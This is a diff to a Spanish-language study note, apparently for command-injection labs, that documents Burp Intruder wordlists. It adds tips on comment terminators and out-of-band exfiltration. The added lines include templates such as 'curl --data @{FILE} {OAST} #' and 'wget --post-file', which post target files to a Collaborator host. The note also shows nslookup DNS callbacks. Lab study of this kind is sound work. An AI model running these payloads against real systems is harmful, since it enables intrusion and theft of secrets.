@@ -23,8 +23,9 @@ tags:
 | Variable | Qué es | Ejemplo |
 | --- | --- | --- |
 | `{OAST}` | Tu subdominio de Burp Collaborator | `abc123.oastify.com` |
+| `{FILE}` | Ruta del archivo a exfiltrar (**específico del objetivo**) | `/home/carlos/secret` |
 
-Solo `cmd-oast.txt` usa placeholder. Las otras dos van listas para usar tal cual.
+Solo `cmd-oast.txt` usa placeholders (`{OAST}` y `{FILE}`). Las otras dos van listas para usar tal cual.
 
 ## 📄 Las tres listas
 
@@ -47,6 +48,10 @@ La salida de `whoami` (`peter-XXXX`) **no es buscable a ciegas**: no sabés qué
 > [!note] Separador **newline** (`0x0a`)
 > El salto de línea también es separador en Linux, pero no entra en un `.txt` de un payload por línea. Probalo a mano (ver [separadores](../os-command-injection.md)) enviando `%0a<comando>` URL-encoded.
 
+> [!tip] Terminador de comentario (` #`) — el **argumento sobrante**
+> Cuando tu inyección cae **en medio** de un comando (ej. `convert img.jpg -resize <inj> salida.jpg`), la app pega un token detrás (`salida.jpg`) que rompe los payloads de un solo separador: `|nslookup {OAST}` queda `nslookup {OAST} salida.jpg` → toma `salida.jpg` como servidor DNS → **sin hit**. El `#` **comenta** todo lo que sigue y lo neutraliza, sin importar el separador. Las tres listas traen variantes `1<sep>…<cmd> #`.
+> **Requisito:** el `#` debe ir **precedido de espacio** (por eso terminan en `` #``); pegado a un token no comenta. Alternativas que también cierran limpio: `& … &`, `|| … ||` o ejecución inline (`` `…` `` / `$()`).
+
 > [!tip] El wrapper `<relleno>|| … ||`
 > El relleno de la izquierda (un valor válido, p. ej. `test@test.com`) alimenta el comando original; los `||` de ambos lados **aíslan** el tuyo para que lo que la app pegue después no lo rompa. El detalle está en el [entry point](../os-command-injection.md).
 
@@ -56,4 +61,4 @@ La salida de `whoami` (`peter-XXXX`) **no es buscable a ciegas**: no sabés qué
 - OOB confirmar / exfil → [[vulnerabilities/027-os-command-injection/examples/004-blind-oob-interaction|004]] · [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005]]
 
 > [!warning] Exfil de un secreto concreto
-> Meter `cat /home/carlos/secret` en el subdominio DNS, o POSTear un archivo entero, es **específico del objetivo** → vive en los ejemplos [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005]] / [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006]], no en esta wordlist agnóstica. Acá `cmd-oast.txt` solo demuestra exfil inline genérico (`whoami`, `/etc/hostname`).
+> Meter `cat /home/carlos/secret` en el subdominio DNS es **específico del objetivo** y su walkthrough (trocear/base64 para DNS, `--data` vs `--data-binary`, leer la interacción HTTP) vive en los ejemplos [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005]] / [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006]]. Para tenerlo a mano en Intruder, `cmd-oast.txt` ahora incluye una **plantilla genérica** de exfil de archivo (`curl --data @{FILE} {OAST} #`, `wget --post-file {FILE} …`): reemplazá `{FILE}` por la ruta del secreto. El resto de la lista sigue siendo exfil inline genérico (`whoami`, `/etc/hostname`).
